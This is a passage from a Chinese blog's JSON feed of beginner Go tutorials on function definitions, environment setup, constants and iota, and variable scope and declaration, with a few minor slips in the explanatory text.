            "content_html": "<blockquote>\n<p>函数是基本的代码块，用于执行一个任务。<br>\nGo 语言最少有个 main () 函数。<br>\n你可以通过函数来划分不同功能，逻辑上每个函数执行的是指定的任务。<br>\n函数声明告诉了编译器函数的名称，返回类型，和参数。<br>\nGo 语言标准库提供了多种可动用的内置的函数。例如，len ()<br>\n 函数可以接受不同类型参数并返回该类型的长度。如果我们传入的是字符串则返回字符串的长度，如果传入的是数组，则返回数组中包含的元素个数。</p>\n</blockquote>\n<h1 id=\"函数定义\"><a class=\"markdownIt-Anchor\" href=\"#函数定义\">#</a> 函数定义</h1>\n<p>函数定义格式如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func function_name( [parameter list] ) [return_types] &#123;</span><br><span class=\"line\">   函数体</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>函数定义解析：<br>\nfunc：函数由 func 开始声明<br>\n function_name：函数名称，参数列表和返回值类型构成了函数签名。<br>\nparameter<br>\nlist：参数列表，参数就像一个占位符，当函数被调用时，你可以将值传递给参数，这个值被称为实际参数。参数列表指定的是参数类型、顺序、及参数个数。参数是可选的，也就是说函数也可以不包含参数。<br>\nreturn_types：返回类型，函数返回一列值。return_types<br>\n 是该列值的数据类型。有些功能不需要返回值，这种情况下 return_types<br>\n 不是必须的。<br>\n函数体：函数定义的代码集合。</p>\n</blockquote>\n<h2 id=\"实例\"><a class=\"markdownIt-Anchor\" href=\"#实例\">#</a> 实例</h2>\n",
            "tags": [
                "GO"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/go%E8%AF%AD%E8%A8%80%E5%88%9D%E5%AD%A6/",
            "url": "https://nnnpc.github.io/2024/04/16/go%E8%AF%AD%E8%A8%80%E5%88%9D%E5%AD%A6/",
            "title": "go语言初学",
            "date_published": "2024-04-16T05:58:18.992Z",
            "content_html": "<h1 id=\"go环境搭建\"><a class=\"markdownIt-Anchor\" href=\"#go环境搭建\">#</a> go 环境搭建</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9nb2xhbmcuZ29vZ2xlLmNuL2RsLw==\">https://golang.google.cn/dl/</span><br>\ngo 官网下载，我下载的是 msi 版本的</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vHP0NQrTy2GjYue7.png!thumbnail\" alt=\"\"></p>\n<p>一直 next 就行，路径根据自己的想法来安装</p>\n<p>安装完成之后去环境变量里查看一下有无自动添加到环境变量中，没有的话就需要手动添加</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/zeiuhJI2y95OKeu2.png!thumbnail\" alt=\"\"></p>\n<p>查看是否添加完成</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">go version</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/kgRMDlp4km6s8K2H.png!thumbnail\" alt=\"\"></p>\n<p>windows 中的配置</p>\n<p>终端输入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 查看Go的环境变量</span><br><span class=\"line\">go env</span><br><span class=\"line\"># 清除缓存</span><br><span class=\"line\">go clean --modcache</span><br><span class=\"line\"># 设置GOBIN</span><br><span class=\"line\">go env -w GOBIN=&quot;D:\\go\\bin&quot;</span><br><span class=\"line\"># 配置代理</span><br><span class=\"line\">go env -w GO111MODULE=&quot;on&quot;</span><br><span class=\"line\">go env -w GOPROXY=&quot;https://goproxy.cn,direct&quot;</span><br><span class=\"line\"># 再次查看</span><br><span class=\"line\">go env</span><br></pre></td></tr></table></figure>\n<p>最终配置<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/c36nEjWQj7naar7k.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<h1 id=\"vscode配置\"><a class=\"markdownIt-Anchor\" href=\"#vscode配置\">#</a> VScode 配置</h1>\n<p>vscode 使用 go 插件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/s7ve54MqQSXSVZNw.png!thumbnail\" alt=\"\"></p>\n<p>再安装 go 组件，Ctrl+Shift+P，再输入 Go:Install/Update Tools，全选就 ok</p>\n<p>等待一会，全部安装完毕之后就配置完成了</p>\n<h1 id=\"编第一个go程序\"><a class=\"markdownIt-Anchor\" href=\"#编第一个go程序\">#</a> 编第一个 go 程序</h1>\n<p>在自己想要的目录下打开终端，输入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">go mod init dev</span><br></pre></td></tr></table></figure>\n<p>会创建一个 go.mod 文件，在 vscode 中打开该文件夹<br>\n创建.go 为扩展名的文件（这里创建了 hello.go）</p>\n<p>需要注意的是在 go 语言中 &quot;{&quot; 不能单独一行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    fmt.Println(&quot;Hello, World!&quot;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在该 go 文件的同一级目录下打开终端运行文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">go run hello.go</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/u8jJTlLO4nCMhmQR.png!thumbnail\" alt=\"\"></p>\n<p>同时也可以使用命令生成 exe 文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">go build hello.go</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/iUjhGypCEvItJbbg.png!thumbnail\" alt=\"\"></p>\n",
            "tags": [
                "GO"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/go%E8%AF%AD%E8%A8%80%E5%B8%B8%E9%87%8F/",
            "url": "https://nnnpc.github.io/2024/04/16/go%E8%AF%AD%E8%A8%80%E5%B8%B8%E9%87%8F/",
            "title": "go语言常量",
            "date_published": "2024-04-16T05:58:18.990Z",
            "content_html": "<h1 id=\"常量的定义\"><a class=\"markdownIt-Anchor\" href=\"#常量的定义\">#</a> 常量的定义</h1>\n<blockquote>\n<p>常量是一个简单值的标识符，在程序运行时，不会被修改的量。<br>\n常量中的数据类型只可以是布尔型、数字型（整数型、浮点型和复数）和字符串型。</p>\n</blockquote>\n<p>格式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const identifier [type] = value</span><br></pre></td></tr></table></figure>\n<p>和变量的声明相似，常量的定义使用关键字 const<br>\n 和变量的声明相同，常量也可以省略类型说明符<br>\n [type]（编译器可以根据 value 值来自动判断类型）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">显式类型定义： const b string = &quot;abc&quot;</span><br><span class=\"line\">隐式类型定义： const b = &quot;abc&quot;</span><br></pre></td></tr></table></figure>\n<p>多个相同类型的定义可以缩写为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const c_name1, c_name2 = value1, value2</span><br></pre></td></tr></table></figure>\n<p>实例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">   const LENGTH int = 10</span><br><span class=\"line\">   const WIDTH int = 5  </span><br><span class=\"line\">   var area int</span><br><span class=\"line\">   const a, b, c = 1, false, &quot;str&quot; //多重赋值</span><br><span class=\"line\">   area = LENGTH * WIDTH</span><br><span class=\"line\">   fmt.Printf(&quot;面积为 : %d&quot;, area)</span><br><span class=\"line\">   println()</span><br><span class=\"line\">   println(a, b, c)  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>结果<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6CpKCZs3MfFSzFsE.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>常量用来枚举：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const (</span><br><span class=\"line\">    Unknown = 0</span><br><span class=\"line\">    Female = 1</span><br><span class=\"line\">    Male = 2</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<p>0，1，2 分别代表未知性别，男，女<br>\n同时，常量可以使用内置函数来计算表达式的值，如 len (), cap (),<br>\nunsafe.Sizeof()</p>\n<p>实例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\">import &quot;unsafe&quot;</span><br><span class=\"line\">const (</span><br><span class=\"line\">    a = &quot;abc&quot;</span><br><span class=\"line\">    b = len(a)</span><br><span class=\"line\">    c = unsafe.Sizeof(a)</span><br><span class=\"line\">)</span><br><span class=\"line\">func main()&#123;</span><br><span class=\"line\">    println(a, b, c)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/d6mIW1xjZcdVd0lA.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<h1 id=\"iota\"><a class=\"markdownIt-Anchor\" href=\"#iota\">#</a> iota</h1>\n<blockquote>\n<p>iota，特殊常量，可以认为是一个可以被编译器修改的常量。<br>\niota 在 const 关键字出现时将被重置为 0 (const 内部的第一行之前)，const<br>\n 中每新增一行常量声明将使 iota 计数一次 (iota 可理解为 const<br>\n 语句块中的行索引)。</p>\n</blockquote>\n<p>iota 用来枚举：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const (</span><br><span class=\"line\">    a = iota</span><br><span class=\"line\">    b = iota</span><br><span class=\"line\">    c = iota</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<p>第一行的 iota 为 0，接下来每增加一行，iota 的值都会加 1<br>\n 因此例如 a=0，b=1，c=2 可以简写为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const (</span><br><span class=\"line\">    a = iota</span><br><span class=\"line\">    b</span><br><span class=\"line\">    c</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vQEPGz1yxPfjQw9t.png!thumbnail\" alt=\"\"></p>\n<p>输出：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZMHzFZ0dgUamqPvA.png!thumbnail\" alt=\"\" title=\"fig:\"><br>\niota 用法：其实就是多加一行 iota 的值就多加 1，除非赋给常量另外的 value，不然每一行的值就是上一行 iota 的值 + 1（iota 的值不会被其它赋值干扰和打断)，用一个实例来简单说明</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    const (</span><br><span class=\"line\">            a = iota   //0</span><br><span class=\"line\">            b          //1</span><br><span class=\"line\">            c          //2</span><br><span class=\"line\">            d = &quot;ha&quot;   //独立值，iota += 1</span><br><span class=\"line\">            e          //&quot;ha&quot;   iota += 1</span><br><span class=\"line\">            f = 100    //iota +=1</span><br><span class=\"line\">            g          //100  iota +=1</span><br><span class=\"line\">            h = iota   //7,恢复计数</span><br><span class=\"line\">            i          //8</span><br><span class=\"line\">    )</span><br><span class=\"line\">    fmt.Println(a,b,c,d,e,f,g,h,i)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/cCIKeGrZ20AiW1uH.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>看个移位实例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\">const (</span><br><span class=\"line\">    i=1&lt;&lt;iota</span><br><span class=\"line\">    j=3&lt;&lt;iota</span><br><span class=\"line\">    k</span><br><span class=\"line\">    l</span><br><span class=\"line\">)</span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    fmt.Println(&quot;i=&quot;,i)</span><br><span class=\"line\">    fmt.Println(&quot;j=&quot;,j)</span><br><span class=\"line\">    fmt.Println(&quot;k=&quot;,k)</span><br><span class=\"line\">    fmt.Println(&quot;l=&quot;,l)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/uhT9dMUZtKAZZclO.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<blockquote>\n<p>iota 表示从 0 开始自动加 1，所以 i=1&lt;&lt;0, j=3&lt;&lt;1（<strong>&lt;&lt;</strong><br>\n 表示左移的意思），即：i=1, j=6，这没问题，关键在 k 和 l，从输出结果看<br>\n k=3&lt;&lt;2，l=3&lt;&lt;3。<br>\n简单表述:<br>\n<strong>i=1</strong>：左移 0 位，不变仍为 1。<br>\n<strong>j=3</strong>：左移 1 位，变为二进制 <strong>110</strong>，即 6。<br>\n<strong>k=3</strong>：左移 2 位，变为二进制 <strong>1100</strong>，即 12。<br>\n<strong>l=3</strong>：左移 3 位，变为二进制 <strong>11000</strong>，即 24。<br>\n注：&lt;&lt;n==*(2^n)。</p>\n</blockquote>\n<p>简单来说，&lt;&lt; 符号代表着向左移位，a&lt;&lt;b 代表着将 a 的二进制位像左移动 b 位，在上述实例的枚举中，赋值给常量的值如果没有进行新的赋值那么就为上一行所赋的值不变，iota 每增加一行就 + 1，因此 k 和 l 都为 3，但是分别左移 2 位和 3 位即 k=3&lt;&lt;2，l=3&lt;&lt;3，即：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const (</span><br><span class=\"line\">    i=1&lt;&lt;0</span><br><span class=\"line\">    j=3&lt;&lt;1</span><br><span class=\"line\">    K=3&lt;&lt;2</span><br><span class=\"line\">    l=3&lt;&lt;3</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "GO"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/go%E8%AF%AD%E8%A8%80%E5%8F%98%E9%87%8F%E4%BD%9C%E7%94%A8%E5%9F%9F/",
            "url": "https://nnnpc.github.io/2024/04/16/go%E8%AF%AD%E8%A8%80%E5%8F%98%E9%87%8F%E4%BD%9C%E7%94%A8%E5%9F%9F/",
            "title": "go语言变量作用域",
            "date_published": "2024-04-16T05:58:18.989Z",
            "content_html": "<blockquote>\n<p>作用域为已声明标识符所表示的常量、类型、变量、函数或包在源代码中的作用范围。<br>\nGo 语言中变量可以在三个地方声明：<br>\n函数内定义的变量称为局部变量<br>\n函数外定义的变量称为全局变量<br>\n函数定义中的变量称为形式参数</p>\n</blockquote>\n<h1 id=\"局部变量\"><a class=\"markdownIt-Anchor\" href=\"#局部变量\">#</a> 局部变量</h1>\n<blockquote>\n<p>在函数体内声明的变量称之为局部变量，它们的作用域只在函数体内，参数和返回值变量也是局部变量。</p>\n</blockquote>\n<p>因为之前也用过，因此不过多叙述，接下来用简单的代码展示一下局部变量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    var a, b, c int</span><br><span class=\"line\"></span><br><span class=\"line\">    a = 10</span><br><span class=\"line\">    b = 20</span><br><span class=\"line\">    c = a + b</span><br><span class=\"line\"></span><br><span class=\"line\">    fmt.Printf(&quot;结果： a = %d, b = %d and c = %d\\n&quot;, a, b, c)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/gY0j2etnawVMnPhP.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>如上述代码，abc 三个变量在 main 函数中被声明，也就是 abc 的作用域在 main 函数当中，外部无法不声明直接引用这三个变量</p>\n<h1 id=\"全局变量\"><a class=\"markdownIt-Anchor\" href=\"#全局变量\">#</a> 全局变量</h1>\n<blockquote>\n<p>在函数体外声明的变量称之为全局变量，全局变量可以在整个包甚至外部包（被导出后）使用。</p>\n</blockquote>\n<p>全局变量之所以被称为全局，也就是在整一个程序中都可以被引用。因此在函数体外进行声明，在任何函数当中都可以使用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">var g int</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    var a, b int</span><br><span class=\"line\"></span><br><span class=\"line\">    a = 10</span><br><span class=\"line\">    b = 20</span><br><span class=\"line\">    g = a + b</span><br><span class=\"line\"></span><br><span class=\"line\">    fmt.Printf(&quot;结果： a = %d, b = %d and g = %d\\n&quot;, a, b, g)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BRUfNatomzmI98nb.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>如上述程序可以知道，ab 依然为 main 函数中声明的局部变量，只能在 main 函数中使用，但 g 在函数外进行声明，因此 g 为全局变量，main 函数中也可以使用</p>\n<p>这时候可以就会想到一个问题，全局变量和局部变量的变量名相同时会不会引起冲突呢？答案是并不会，但在函数体当中，会优先考虑该函数体中声明的全局变量，如下实例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">var g int = 20</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    var g int = 10</span><br><span class=\"line\">    fmt.Printf(&quot;结果： g = %d\\n&quot;, g)</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/o5UWbCRCElJXUFHN.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>可以看到变量名同为 g 时，main 函数中的优先输出是局部变量的 g 值</p>\n<h1 id=\"形式参数\"><a class=\"markdownIt-Anchor\" href=\"#形式参数\">#</a> 形式参数</h1>\n<blockquote>\n<p>形式参数会作为函数的局部变量来使用</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">var a int = 20</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    var a int = 10</span><br><span class=\"line\">    var b int = 20</span><br><span class=\"line\">    var c int = 0</span><br><span class=\"line\"></span><br><span class=\"line\">    fmt.Printf(&quot;main()函数中 a = %d\\n&quot;, a)</span><br><span class=\"line\">    c = sum(a, b)</span><br><span class=\"line\">    fmt.Printf(&quot;main()函数中 c = %d\\n&quot;, c)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func sum(a, b int) int &#123;</span><br><span class=\"line\">    fmt.Printf(&quot;sum() 函数中 a = %d\\n&quot;, a)</span><br><span class=\"line\">    fmt.Printf(&quot;sum() 函数中 b = %d\\n&quot;, b)</span><br><span class=\"line\"></span><br><span class=\"line\">    return a + b</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/qDL0KThcBshap6IG.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>分别来解释一下输出和作用域，在两个函数之外的 a 毋庸置疑是全局变量，作用域在全局，但是 main 函数中也声明了变量 a，因此优先级高于全局的，输出为 10<br>\n。接着调用了 sum 函数，而在 sum 函数定义了 a，b 两个形参，作为局部变量，因此作用域仅在 sum 函数中，在接收到 main 函数中 a，b 的值传递后，输出的 a，b 值也就是 main 函数中 a，b 的值，为 10 和 20<br>\n。将返回的 a+b 值赋给了 c，因此 main 函数中输出的 c 值为 30</p>\n<p>当函数中没有进行重新声明赋值时，默认使用全局变量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package main</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;fmt&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">var a int = 20</span><br><span class=\"line\">var b int = 20</span><br><span class=\"line\"></span><br><span class=\"line\">func main() &#123;</span><br><span class=\"line\">    var c = 0</span><br><span class=\"line\">    c = sum(a, b)</span><br><span class=\"line\">    fmt.Printf(&quot;main() 函数中 c = %d\\n&quot;, c)</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func sum(a, b int) int &#123;</span><br><span class=\"line\">    fmt.Printf(&quot;sum() 函数中 a = %d\\n&quot;, a)</span><br><span class=\"line\">    fmt.Printf(&quot;sum() 函数中 b = %d\\n&quot;, b)</span><br><span class=\"line\"></span><br><span class=\"line\">    return a + b</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出：<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/fdkdqXXyXfdkcyGP.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<h1 id=\"初始化局部和全局变量\"><a class=\"markdownIt-Anchor\" href=\"#初始化局部和全局变量\">#</a> 初始化局部和全局变量</h1>\n<p>不同类型的局部和全局变量默认值为：</p>\n<p>数据类型   初始化默认值</p>\n<hr>\n<p>int        0<br>\nfloat32    0<br>\npointer    nil</p>\n",
            "tags": [
                "GO"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/go%E8%AF%AD%E8%A8%80%E5%8F%98%E9%87%8F/",
            "url": "https://nnnpc.github.io/2024/04/16/go%E8%AF%AD%E8%A8%80%E5%8F%98%E9%87%8F/",
            "title": "go语言变量",
            "date_published": "2024-04-16T05:58:18.987Z",
            "content_html": "<p>go 语言中声明变量一般使用 var 关键字</p>\n<p>格式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var identifier type</span><br></pre></td></tr></table></figure>\n<p>可以一次声明多个变量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var identifier1 identifier2 type</span><br></pre></td></tr></table></figure>\n<p>整体代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span 